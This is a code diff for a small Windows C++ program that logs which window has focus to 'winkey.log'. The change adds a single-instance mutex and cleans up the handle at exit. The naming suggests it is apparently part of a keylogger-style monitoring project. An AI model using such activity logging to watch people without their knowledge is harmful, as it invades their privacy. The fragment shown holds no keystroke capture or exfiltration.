@@ -2,6 +2,7 @@
 
 std::wofstream  logFile;
 HWND            lastWindow = nullptr;
+HANDLE          singleInstanceMutex = nullptr;
 
 void LogForegroundWindow(void) {
     // Get a handle to the currently focused window
@@ -33,6 +34,13 @@ void LogForegroundWindow(void) {
 }
 
 int main(void) {
+    // Prevent multiple instances of this program
+    singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        std::cerr << "Already running" << std::endl;
+        return 1;
+    }
+
     // Open the outfile in appending mode
     logFile.open("winkey.log", std::ios::app);
     if (!logFile.is_open()) {
@@ -46,6 +54,8 @@ int main(void) {
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 
+    // Cleanup
+    CloseHandle(singleInstanceMutex);
     logFile.close();
 
     return 0;
